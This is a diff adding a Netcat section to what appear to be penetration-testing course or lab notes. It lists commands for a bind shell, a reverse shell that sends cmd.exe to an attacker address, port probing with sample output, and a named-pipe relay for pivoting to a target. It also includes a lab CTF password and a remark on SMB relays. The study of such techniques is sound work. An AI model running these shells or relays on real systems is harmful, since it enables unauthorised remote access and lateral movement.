@@ -333,3 +333,37 @@ Bucket found but access denied: prod
 
 ## 3.6 Netcat
 
+```bash
+# Creates a NC listener on port 2222 and executes /bin/sh upon connection
+nc -l -p 2222 -e /bin/sh
+
+# Setup reverse shell listener on attack box
+nc -lvnp 2222
+
+# Pass all output of cmd.exe execution across network to attacker
+nc 10.10.75.1 2222 -e cmd.exe
+
+# Try to connect to 172.x.x.x over port 80 with 3 sec timeout and zero I/O mode
+nc -vvv -z -w3 172.30.0.55 80
+# Firewall blocking inbound connections
+172.30.0.55: inverse host lookup failed: Unknown server error
+(UNKNOWN) [172.30.0.55] 80 (http) : Connection timed out
+ sent 0, rcvd 0
+# Firewall not blocking a pivot system running same command
+172.30.0.55: inverse host lookup failed: Unknown server error : No such file or directory
+(UNKNOWN) [172.30.0.55] 80 (?) open
+
+# Setup a relay through the pivot host
+nc -l -p 8080 < namedpipe | nc 172.30.0.55 80 > namedpipe
+
+# Make a connection to pivot that will get routed to target
+sec504@slingshot:~$ curl http://172.30.0.50:8080
+<html>
+
+	You should write this password
+	down for the CTF: Carolina1
+
+</html>
+```
+
+NC can also be used for SMB relays by just listening on port 445 and using `sudo` since Linux only allows `root` to listen on ports lower than `1024`.
